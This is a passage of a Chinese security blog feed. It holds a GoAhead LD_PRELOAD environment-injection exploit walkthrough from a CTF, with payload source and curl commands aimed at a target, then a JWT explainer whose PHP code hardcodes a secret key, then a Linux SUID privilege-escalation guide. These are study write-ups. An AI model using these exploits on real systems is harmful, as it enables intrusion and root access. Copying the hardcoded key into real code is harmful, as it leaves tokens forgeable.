class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译成恶意so </p>
<figure class="highlight shell"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">gcc -shared -fPIC ./exp.c -o exp.so</span><br></pre></td></tr></table></figure>

<p>攻击机监听</p>
<p><img src="C:/Users/86132/AppData/Roaming/Typora/typora-user-images/image-20220628135630299.png" alt="image-20220628135630299"></p>
<p>另开一个shell向victim发送恶意so</p>
<figure class="highlight shell"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">curl -X POST --data-binary @exp.so http://192.168.156.128:8080/cgi-bin/index\?LD_PRELOAD\=/proc/self/fd/0 </span><br></pre></td></tr></table></figure>

<p>成功反弹shell</p>
<h1 id="ACTF-2022-gogogo"><a href="#ACTF-2022-gogogo" class="headerlink" title="ACTF 2022 gogogo"></a>ACTF 2022 gogogo</h1><p><strong>学习链接</strong></p>
<p><a href="https://www.leavesongs.com/PENETRATION/goahead-en-injection-cve-2021-42342.html">GoAhead环境变量注入复现踩坑记 | 离别歌 (leavesongs.com)</a></p>
<p>本地把服务跑起来开始复现</p>
<p><img src="http://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202206301504204.png" alt="image-20220630150409166"></p>
<p>在p神博客里可以看到这个漏洞是由于运行了cgi程序造成的环境变量注入 在官方给的源码里刚好有一个cgi程序 并且可以用来查看环境变量</p>
<p><img src="http://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202206301504666.png" alt="image-20220630150435604"></p>
<p>这里利用表单发送一个文件 并且将该文件指向LD_PRELOAD  发现注入成功 证明漏洞的存在</p>
<p><img src="http://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202206301506489.png" alt="image-20220630150611415"></p>
<p>所以我们要做的就是发送一个恶意文件 并且将他指向LD_PRELOAD  从而劫持系动态链接库 （在CVE-2017-17562中 是将LD_PRELIOAD指向了标准输入/proc/self/fd/0 所以如果post一个恶意的文件过去就会直接作为动态链接库的参数）</p>
<p>但是在这个漏洞中由于上述方法被修复 所以采用发送multipart表单进行绕过</p>
<p>但是在p神中的博客也提到了 由于环境的问题 使用multipart表单基本上是行不通的 所以采用另外一种方法</p>
<p>先写一个payload.c文件（也可以改成弹shell的代码 但是由于环境问题弹shell成功率极低 所以选择了直接cat flag）</p>
<figure class="highlight c"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">before_main</span><span class="params">(<span class="type">void</span>)</span> __<span class="title function_">attribute__</span><span class="params">((constructor))</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">before_main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;Hello: World\r\n\r\n&quot;</span>, <span class="number">16</span>);</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;Hacked\n&quot;</span>, <span class="number">7</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译为恶意so插件 这里要注意由于goahead有上传大小限制 因此在编译时要用-s对so文件进行压缩</p>
<figure class="highlight shell"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">gcc -s -shared -fPIC ./payload.c -o payload.so</span><br></pre></td></tr></table></figure>

<p>这里上传so文件有两种方式</p>
<ul>
<li><p>使用shellcode</p>
<figure class="highlight shell"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">curl -v -F data=@payload.so -F &quot;LD_PRELOAD=/proc/self/fd/7&quot; http://192.168.1.112:8080/cgi-bin/hello</span><br></pre></td></tr></table></figure>

<p>但是使用shellcode的方法在p神博客中提到了 并且有两个问题</p>
<ul>
<li>我们并不知道新开启的进程进程号是多少 因此需要对每一个进程号进行爆破</li>
<li>由于goahead在上传文件时和php类似 会先存到一个临时文件夹里并且会在上传后立刻删除 所以执行到cgi程序后进程号已经被关闭了 因此导致了劫持失败</li>
</ul>
<p>综合这些点shellcode并不是一个好的上传方法 所以选择下面的方法</p>
<ul>
<li>利用html表单进行上传</li>
</ul>
<p>随便去菜鸟教程扒了一个表单 记得用的时候重写一下目标ip</p>
<figure class="highlight html"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>菜鸟教程(runoob.com)<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://39.107.83.203:10218&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>利用burp拦截上传表单的数据包进行改包 原理就是在so文件后面增加大量的脏字符 并且调整content-length的长度 让数据包的有效载荷（so文件）能够被执行 并且留下一大堆垃圾字符继续上传 上传时进程号就不会被关闭了 可以通过劫持LD_PRELOAD劫持该进程 进程号一般都是6或者7 基本上都出现在6上<br><img src="http://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202206301723804.jpg" alt="11"></p>
<p><img src="http://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202206301723468.jpg" alt="2"></p>
<p><img src="http://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202206301724444.jpg" alt="3"></p>
<p>这里回显输出成功 只需要把恶意so的c文件换成system(“cat /flag”);就可以了 如果出现了连接超时 说明脏字符少了 并且content-length不匹配 最好调到15000左右 然后多加一些脏字符就可以了</p>
]]></content>
      <categories>
        <category>网安</category>
      </categories>
      <tags>
        <tag>Goahead</tag>
        <tag>LD_PRELOAD</tag>
      </tags>
  </entry>
  <entry>
    <title>JWT</title>
    <url>/2022/04/26/JWT/</url>
    <content><![CDATA[<h1 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h1><h2 id="什么是JWT"><a href="#什么是JWT" class="headerlink" title="什么是JWT"></a>什么是JWT</h2><p>JSON Web Token ，通过数字签名的方式以JSON对象为载体 在不同的服务终端之间安全的传输信息</p>
<h2 id="JWT有什么用"><a href="#JWT有什么用" class="headerlink" title="JWT有什么用"></a>JWT有什么用</h2><p>JWT最常见的是授权认证 一旦用户登录 后续每个请求都将包含JWT 系统在每次处理用户的请求之前 都要先进行JWT安全校验 通过之后再进行处理</p>
<h2 id="JWT的组成"><a href="#JWT的组成" class="headerlink" title="JWT的组成"></a>JWT的组成</h2><p>JWT由三部分组成 用.拼接 类似于下面的格式 三部分内容都是加密后的密文</p>
<figure class="highlight json"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">xxxxxxx.xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.xxxxxxxxxxxxxxxx </span><br></pre></td></tr></table></figure>

<p>三个部分分别是</p>
<p>Header</p>
<figure class="highlight json"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">&#x27;typ&#x27;<span class="punctuation">:</span> &#x27;JWT&#x27;<span class="punctuation">,</span>  <span class="comment">//类型</span></span><br><span class="line">&#x27;alg&#x27;<span class="punctuation">:</span> &#x27;HS256&#x27; <span class="comment">//Signature要用到的加密算法</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>Payload 载荷 存放有效信息</p>
<figure class="highlight json"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span> &#x27;<span class="number">1234567890</span>&#x27;<span class="punctuation">,</span> <span class="comment">//</span></span><br><span class="line">	<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> &#x27;john&#x27;<span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;admin&quot;</span><span class="punctuation">:</span><span class="keyword">true</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>Payload中可标注的其他信息</p>
<figure class="highlight json"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;iss&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin&quot;</span><span class="punctuation">,</span>          <span class="comment">//该JWT的签发者</span></span><br><span class="line">    <span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span> <span class="number">1535967430</span><span class="punctuation">,</span>        <span class="comment">//签发时间</span></span><br><span class="line">    <span class="attr">&quot;exp&quot;</span><span class="punctuation">:</span> <span class="number">1535974630</span><span class="punctuation">,</span>        <span class="comment">//过期时间</span></span><br><span class="line">    <span class="attr">&quot;nbf&quot;</span><span class="punctuation">:</span> <span class="number">1535967430</span><span class="punctuation">,</span>         <span class="comment">//该时间之前不接收处理该Token</span></span><br><span class="line">    <span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span> <span class="string">&quot;www.admin.com&quot;</span><span class="punctuation">,</span>   <span class="comment">//面向的用户</span></span><br><span class="line">    <span class="attr">&quot;jti&quot;</span><span class="punctuation">:</span> <span class="string">&quot;9f10e796726e332cec401c569969e13e&quot;</span>   <span class="comment">//该Token唯一标识</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>Signature 由三部分组成 base64加密后的header base64加密后的payload 以及前两个内容加密后的以Header中指定加密方式的二次加密</p>
<figure class="highlight json"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">encodeString = base64UrlEncode(header) + &#x27;.&#x27; + base64UrlEncode(payload);</span><br><span class="line">signature = HMACSHA256(encodedString<span class="punctuation">,</span> &#x27;secret&#x27;);</span><br></pre></td></tr></table></figure>

<h2 id="JWT的使用流程"><a href="#JWT的使用流程" class="headerlink" title="JWT的使用流程"></a>JWT的使用流程</h2><p><strong>JWT的使用流程</strong></p>
<ul>
<li>初次登录：用户初次登录，输入用户名密码</li>
<li>密码验证：服务器从数据库取出用户名和密码进行验证</li>
<li>生成JWT：服务器端验证通过，根据从数据库返回的信息，以及预设规则，生成JWT</li>
<li>返还JWT：服务器的HTTP RESPONSE中将JWT返还</li>
<li>带JWT的请求：以后客户端发起请求，HTTP REQUEST</li>
<li>HEADER中的Authorizatio字段都要有值，为JWT</li>
<li>服务器验证JWT</li>
</ul>
<h2 id="PHP-生成JWT-Token"><a href="#PHP-生成JWT-Token" class="headerlink" title="PHP 生成JWT Token"></a>PHP 生成JWT Token</h2><figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * PHP实现jwt</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JwtAuth</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//头部</span></span><br><span class="line">  <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$header</span>=<span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;alg&#x27;</span>=&gt;<span class="string">&#x27;HS256&#x27;</span>, <span class="comment">//生成signature的算法</span></span><br><span class="line">    <span class="string">&#x27;typ&#x27;</span>=&gt;<span class="string">&#x27;JWT&#x27;</span>  <span class="comment">//类型</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">//使用HMAC生成信息摘要时所使用的密钥</span></span><br><span class="line">  <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$key</span>=<span class="string">&#x27;root123456&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 获取jwt token</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> array $payload jwt载荷  格式如下非必须</span></span><br><span class="line"><span class="comment">   * [</span></span><br><span class="line"><span class="comment">   * &#x27;iss&#x27;=&gt;&#x27;jwt_admin&#x27;, //该JWT的签发者</span></span><br><span class="line"><span class="comment">   * &#x27;iat&#x27;=&gt;time(), //签发时间</span></span><br><span class="line"><span class="comment">   * &#x27;exp&#x27;=&gt;time()+7200, //过期时间</span></span><br><span class="line"><span class="comment">   * &#x27;nbf&#x27;=&gt;time()+60, //该时间之前不接收处理该Token</span></span><br><span class="line"><span class="comment">   * &#x27;sub&#x27;=&gt;&#x27;www.mano100.cn&#x27;, //面向的用户</span></span><br><span class="line"><span class="comment">   * &#x27;jti&#x27;=&gt;md5(uniqid(&#x27;JWT&#x27;).time()) //该Token唯一标识</span></span><br><span class="line"><span class="comment">   * ]</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> bool|string</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getToken</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$payload</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$payload</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="variable">$base64header</span>=<span class="built_in">self</span>::<span class="title function_ invoke__">base64UrlEncode</span>(<span class="title function_ invoke__">json_encode</span>(<span class="built_in">self</span>::<span class="variable">$header</span>,JSON_UNESCAPED_UNICODE));</span><br><span class="line">      <span class="variable">$base64payload</span>=<span class="built_in">self</span>::<span class="title function_ invoke__">base64UrlEncode</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$payload</span>,JSON_UNESCAPED_UNICODE));</span><br><span class="line">      <span class="variable">$token</span>=<span class="variable">$base64header</span>.<span class="string">&#x27;.&#x27;</span>.<span class="variable">$base64payload</span>.<span class="string">&#x27;.&#x27;</span>.<span class="built_in">self</span>::<span class="title function_ invoke__">signature</span>(<span class="variable">$base64header</span>.<span class="string">&#x27;.&#x27;</span>.<span class="variable">$base64payload</span>,<span class="built_in">self</span>::<span class="variable">$key</span>,<span class="built_in">self</span>::<span class="variable">$header</span>[<span class="string">&#x27;alg&#x27;</span>]);</span><br><span class="line">      <span class="keyword">return</span> <span class="variable">$token</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 验证token是否有效,默认验证exp,nbf,iat时间</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> string $Token 需要验证的token</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> bool|string</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">verifyToken</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$Token</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="variable">$tokens</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$Token</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$tokens</span>) != <span class="number">3</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$base64header</span>, <span class="variable">$base64payload</span>, <span class="variable">$sign</span>) = <span class="variable">$tokens</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取jwt算法</span></span><br><span class="line">    <span class="variable">$base64decodeheader</span> = <span class="title function_ invoke__">json_decode</span>(<span class="built_in">self</span>::<span class="title function_ invoke__">base64UrlDecode</span>(<span class="variable">$base64header</span>), JSON_OBJECT_AS_ARRAY);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$base64decodeheader</span>[<span class="string">&#x27;alg&#x27;</span>]))</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//签名验证</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">self</span>::<span class="title function_ invoke__">signature</span>(<span class="variable">$base64header</span> . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$base64payload</span>, <span class="built_in">self</span>::<span class="variable">$key</span>, <span class="variable">$base64decodeheader</span>[<span class="string">&#x27;alg&#x27;</span>]) !== <span class="variable">$sign</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$payload</span> = <span class="title function_ invoke__">json_decode</span>(<span class="built_in">self</span>::<span class="title function_ invoke__">base64UrlDecode</span>(<span class="variable">$base64payload</span>), JSON_OBJECT_AS_ARRAY);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//签发时间大于当前服务器时间验证失败</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$payload</span>[<span class="string">&#x27;iat&#x27;</span>]) &amp;&amp; <span class="variable">$payload</span>[<span class="string">&#x27;iat&#x27;</span>] &gt; <span class="title function_ invoke__">time</span>())</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//过期时间小宇当前服务器时间验证失败</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$payload</span>[<span class="string">&#x27;exp&#x27;</span>]) &amp;&amp; <span class="variable">$payload</span>[<span class="string">&#x27;exp&#x27;</span>] &lt; <span class="title function_ invoke__">time</span>())</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//该nbf时间之前不接收处理该Token</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$payload</span>[<span class="string">&#x27;nbf&#x27;</span>]) &amp;&amp; <span class="variable">$payload</span>[<span class="string">&#x27;nbf&#x27;</span>] &gt; <span class="title function_ invoke__">time</span>())</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$payload</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * base64UrlEncode  https://jwt.io/ 中base64UrlEncode编码实现</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> string $input 需要编码的字符串</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">base64UrlEncode</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$input</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="title function_ invoke__">strtr</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$input</span>), <span class="string">&#x27;+/&#x27;</span>, <span class="string">&#x27;-_&#x27;</span>));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * base64UrlEncode https://jwt.io/ 中base64UrlEncode解码实现</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> string $input 需要解码的字符串</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> bool|string</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">base64UrlDecode</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$input</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="variable">$remainder</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$input</span>) % <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$remainder</span>) &#123;</span><br><span class="line">      <span class="variable">$addlen</span> = <span class="number">4</span> - <span class="variable">$remainder</span>;</span><br><span class="line">      <span class="variable">$input</span> .= <span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;=&#x27;</span>, <span class="variable">$addlen</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">strtr</span>(<span class="variable">$input</span>, <span class="string">&#x27;-_&#x27;</span>, <span class="string">&#x27;+/&#x27;</span>));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * HMACSHA256签名  https://jwt.io/ 中HMACSHA256签名实现</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> string $input 为base64UrlEncode(header).&quot;.&quot;.base64UrlEncode(payload)</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> string $key</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> string $alg  算法方式</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">signature</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$input</span>, <span class="keyword">string</span> <span class="variable">$key</span>, <span class="keyword">string</span> <span class="variable">$alg</span> = <span class="string">&#x27;HS256&#x27;</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="variable">$alg_config</span>=<span class="keyword">array</span>(</span><br><span class="line">      <span class="string">&#x27;HS256&#x27;</span>=&gt;<span class="string">&#x27;sha256&#x27;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">self</span>::<span class="title function_ invoke__">base64UrlEncode</span>(<span class="title function_ invoke__">hash_hmac</span>(<span class="variable">$alg_config</span>[<span class="variable">$alg</span>], <span class="variable">$input</span>, <span class="variable">$key</span>,<span class="literal">true</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>JWT</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux提权</title>
    <url>/2022/06/27/Linux%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<h1 id="linux提权"><a href="#linux提权" class="headerlink" title="linux提权"></a>linux提权</h1><h3 id="Suid提权"><a href="#Suid提权" class="headerlink" title="Suid提权"></a>Suid提权</h3><p><strong>linux文件权限</strong></p>
<p><img src="https://s2.loli.net/2022/06/27/vIFdqCX9718he2o.png" alt="image-20220627165925961"></p>
<p><strong>suid权限</strong></p>
<p>suid权在执行时权限为文件所有者的权限 并不是执行者的权限 所以如果root用户的文件有了suid权限 那么其他执行者在执行该文件时就拥有了root权限</p>
<p><img src="https://s2.loli.net/2022/06/27/TM617xAW8dScoGg.png" alt="image-20220627170215962"></p>
<p>这里的S就代表了test文件具有suid权限  但是suid权限只针对二进制可执行文件（如vim cat等）</p>
<figure class="highlight shell"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">chmod u+s filename   设置SUID位</span><br><span class="line">chmod u-s filename   去掉SUID设置</span><br></pre></td></tr></table></figure>

<p>现在已知的具有SUID权限的二进制可执行文件大体有如下这些</p>
<figure class="highlight shell"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">nmap</span><br><span class="line">vim</span><br><span class="line">find</span><br><span class="line">bash</span><br><span class="line">more</span><br><span class="line">less</span><br><span class="line">nano</span><br><span class="line">cp</span><br><span class="line">awk</span><br></pre></td></tr></table></figure>

<p>以下命令可以找到正在系统上运行的所有SUID可执行文件。准确的说，这个命令将从/目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到/dev/null，从而仅列出该用户具有访问权限的那些二进制文件。</p>
<figure class="highlight shell"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/06/27/3JGqnHTh5PDZLdm.png" alt="image-20220627170719157"></p>
<p><strong>一些常用二进制可执行文件提权</strong></p>
<h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>适用版本:nmap2.02至5.21</p>
<p>在早期nmap版本中,带有交互模式,因而允许用户执行shell命令</p>
<p>使用如下命令进入nmap交互模式:</p>
<figure class="highlight bash"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">nmap --interactive</span><br></pre></td></tr></table></figure>

<p>在nmap交互模式中 通过如下命令提权</p>
<figure class="highlight sh"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">nmap&gt; !sh</span><br><span class="line">sh-3.2<span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>msf当中也有利用nmap进行提权的模块</p>
<figure class="highlight plaintext"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">exploit/unix/local/setuid_nmap</span><br></pre></td></tr></table></figure>

